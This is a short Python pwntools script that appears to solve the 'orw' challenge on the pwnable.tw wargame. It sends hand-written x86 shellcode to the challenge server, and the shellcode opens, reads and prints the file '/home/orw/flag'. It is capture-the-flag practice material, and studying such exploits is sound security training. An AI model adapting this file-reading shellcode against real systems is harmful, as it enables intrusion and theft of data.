from pwn import *

#s = process('./orw')
s = remote('chall.pwnable.tw',10001)

print s.recvuntil("Give my your shellcode:")

raw_input('press any key to continue')

shellcode = ''
shellcode += '\xb8\x05\x00\x00\x00'
shellcode += '\xbb\xaa\xa0\x04\x08'
shellcode += '\xb9\x00\x00\x00\x00'
shellcode += '\xba\x00\x00\x00\x00'
shellcode += '\xcd\x80'
shellcode += '\x89\xc3'
shellcode += '\xb8\x03\x00\x00\x00'
shellcode += '\x81\xec\x80\x00\x00\x00'
shellcode += '\x8d\x4c\x24\x80'
shellcode += '\xba\x80\x00\x00\x00'
shellcode += '\xcd\x80'
shellcode += '\x81\xc4\x80\x00\x00\x00'
shellcode += '\xb8\x04\x00\x00\x00'
shellcode += '\xbb\x01\x00\x00\x00'
shellcode += '\xcd\x80'


payload = ''
payload += shellcode
payload += '\x90' * 10		# 63 byte len
payload += '/home/orw/flag'

s.send(payload)

raw_input('press any key to continue')

print s.recv(128)